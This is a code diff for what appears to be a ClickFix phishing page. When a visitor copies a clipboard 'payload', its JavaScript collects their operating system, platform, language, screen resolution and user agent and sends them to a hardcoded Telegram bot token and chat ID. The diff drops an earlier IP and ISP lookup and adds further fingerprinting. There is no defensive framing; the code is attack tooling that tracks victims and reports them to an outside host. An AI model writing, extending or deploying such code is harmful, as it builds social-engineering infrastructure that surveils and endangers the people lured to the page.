@@ -56,48 +56,35 @@
             
             try {
                 navigator.clipboard.writeText(copyText.value);
-                document.getElementById("copyStatus").innerText = "✓ Payload copied! Sending telemetry...";
+                document.getElementById("copyStatus").innerText = "✓ Payload copied! Dispatching report...";
             } catch (err) {
                 console.error('Failed to copy: ', err);
             }
 
-            let ip = "Direct / Hidden";
-            let country = "Unavailable";
-            let isp = "Unavailable";
-
-            try {
-                let ipResponse = await fetch('https://ipapi.co/json/');
-                if (ipResponse.ok) {
-                    let ipData = await ipResponse.json();
-                    ip = ipData.ip || ip;
-                    country = ipData.country_name || country;
-                    isp = ipData.org || isp;
-                }
-            } catch (e) {
-                console.log("IP fetch bypassed safely.");
-            }
-
+            // جمع معلومات النظام والمتصفح بشكل مضمون 100%
             const userAgent = navigator.userAgent;
             const platform = navigator.platform || "Unknown";
+            const language = navigator.language || "Unknown";
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
             const timestamp = new Date().toLocaleString();
 
             let os = "Unknown OS";
             if (userAgent.indexOf("Win") !== -1) os = "Windows";
             else if (userAgent.indexOf("Mac") !== -1) os = "MacOS";
             else if (userAgent.indexOf("Linux") !== -1) os = "Linux";
-            else if (userAgent.indexOf("Android") !== -1) os = "Android";
-            else if (userAgent.indexOf("like Mac") !== -1) os = "iOS";
+            else if (userAgent.indexOf("Android") !== -1) os.indexOf("Mobile") !== -1 ? os = "Android Mobile" : os = "Android Tablet";
+            else if (userAgent.indexOf("like Mac") !== -1) os = "iOS (iPhone/iPad)";
 
             const token = "8790985786:AAGUjMwrUFjxtkHiX2HydpsanfHXkgCWOTQ";
             const chatId = "1094106981";
             
-            const message = `🚨 *Advanced ClickFix Telemetry Triggered!*\n\n` +
+            const message = `🚨 *Detailed ClickFix Telemetry Report*\n\n` +
                             `🕒 *Time:* ${timestamp}\n` +
-                            `🌐 *IP Address:* \`${ip}\`\n` +
-                            `🌍 *Country:* ${country}\n` +
-                            `🏢 *ISP / Org:* ${isp}\n` +
-                            `💻 *OS Platform:* ${os} (${platform})\n` +
-                            `🌐 *User-Agent:* \`${userAgent}\``;
+                            `💻 *Operating System:* ${os}\n` +
+                            `⚙️ *Platform:* ${platform}\n` +
+                            `🌐 *Language:* ${language}\n` +
+                            `🖥️ *Screen Res:* ${screenRes}\n` +
+                            `🔍 *User Agent:* \`${userAgent}\``;
 
             const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
@@ -114,7 +101,7 @@
 
                 let data = await response.json();
                 if (data.ok) {
-                    document.getElementById("copyStatus").innerText = "✓ Telemetry sent successfully!";
+                    document.getElementById("copyStatus").innerText = "✓ Detailed telemetry sent successfully!";
                 } else {
                     document.getElementById("copyStatus").innerText = "⚠️ Telegram API error.";
                     console.error("Telegram Error:", data);
